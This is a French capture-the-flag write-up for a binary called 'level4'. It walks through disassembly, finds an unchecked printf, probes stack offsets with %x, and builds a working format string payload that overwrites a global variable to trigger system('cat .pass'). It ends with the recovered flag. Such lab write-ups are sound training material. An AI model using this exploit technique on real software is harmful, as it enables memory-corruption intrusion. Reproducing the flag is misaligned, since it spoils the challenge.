


# level4


## description
- Il y a un exécutable **level4**.Lorsqu'on l'exécute, il prends des caractères sur **stdin** puis l'affiche.

## Résolution

Dans la fonction n peut voir l'utilisation de **fgets** qui est protégé contre le buffer overflow. 

Dans la fonction **n**, il y a une fonction p qui est appelée qui contient un appel a printf.

      0x08048450 <+12>:    call   0x8048340 <printf@plt>

On voit aussi que **system** appel **cat** sur le fichier **.pass**.

      0x08048499 <+66>:    movl   $0x8048590,(%esp)
       0x080484a0 <+73>:    call   0x8048360 <system@plt>

Dans la fonction n, il y a une comparaison entre la variable **m** et **0x1025544**(16930116)

       0x0804848d <+54>:    mov    eax,ds:0x8049810
       0x08048492 <+59>:    cmp    eax,0x1025544

Donc on va utiliser le format **format string exploit**

    python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit1 && cat /tmp/exploit1 | ./level4 
    
    aaaa b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0
On ne la trouve pas donc on va chercher plus loin.

    python -c 'print "aaaa" + " %x" * 15' > /tmp/exploit1 && cat /tmp/exploit1 | ./level4 
    
    aaaa b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
On trouve notre adresse à la 12e position.

On ne peut pas utiliser la même façon que sur le level3 vu que **fgets** prends maximum 512 caractères.

avec le %d, on peut indiquer la taille du champ.

    python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit1 && cat /tmp/exploit1 | ./level4 
On a le flag.

    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
